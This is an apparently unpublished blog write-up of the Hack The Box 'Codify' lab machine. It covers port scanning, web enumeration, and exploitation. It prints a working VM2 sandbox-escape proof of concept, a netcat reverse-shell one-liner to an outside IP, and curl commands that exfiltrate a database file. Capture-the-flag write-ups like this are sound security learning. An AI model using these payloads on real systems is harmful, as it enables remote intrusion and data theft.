---
published: false
title: Hack The Box Codify Write Up
slug: htb-codify
description: Write up for Codify machine on Hack the box
author: Leon
date: 2024-03-23
cover: /media/1 2zqbeP26SB5iDgOINWaPfQ-3674822343.png
---
Port Enumeration:

We conducted a port scan to assess the available ports on the target IP using the following command:

```
bash
```

```
nmap -p- --min-rate 5000 $TARGET -sV 
```

The scan results unveiled several open ports:

*   Port 22/tcp: Open, hosting an SSH service.
    
*   Port 80/tcp: Open, serving HTTP.
    
*   Port 8888/tcp: Open, possibly related to the Sun AnswerBook service.
    

These findings suggest potential points of entry into the system, with SSH, HTTP, and a less common port being accessible.

Web Enumeration:

Upon accessing the web server on port 80, we were redirected to "codify.htb". To ease further access, we added the domain to our 'etc/hosts' file.

Further investigation of the web server yielded limited results. Despite attempts with basic reverse shells and testing in code editors, we encountered challenges in making significant progress. Examination of the source code and directory paths via DirBuster confirmed the absence of additional accessible pages beyond the visible content.

During this exploration, we noted the utilization of VM2 for the code sandbox, suggesting potential avenues for exploitation.

Exploitation Discovery:

Research into known vulnerabilities for the Node.js library led to a post on GitHub ([https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244)) detailing a vulnerability in the `handleException()` function. This vulnerability enables escaping the sandbox and executing arbitrary code for VM2 versions up to 3.9.16.

The vulnerable code snippet is as follows:

```
javascript
```

```
const {VM} = require("vm2");
const vm = new VM();
const code =  err = {};
const handler = {
   getPrototypeOf(target) {
       (function stack() {
           new Error().stack;
           stack();
       })();
   }
};
const proxiedErr = new Proxy(err, handler);
try {
   throw proxiedErr;
} catch ({constructor: c}) {
   c.constructor('return process')().mainModule.require('child_process').execSync('YOUR BASH COMMAND');
}
console.log(vm.run(code));
```

Executing a bash command such as `ls` or `whoami` confirms the functionality of the code.

Now, it's time for Remote Code Execution (RCE)! I utilized the following payload for this purpose:

```
bash
```

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 443 >/tmp/f
```

This payload establishes a reverse shell to 10.0.0.1 on port 443.

Additionally, we discovered a database file located at `/var/www/contacts/tickets.db`. To exfiltrate the file, we utilized the following method:

```
bash
```

```
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver

# Send a file
curl -X POST http://HOST/upload -F 'files=@tickets.db' 
```

This process enables the transfer of the database file for further analysis and exploitation.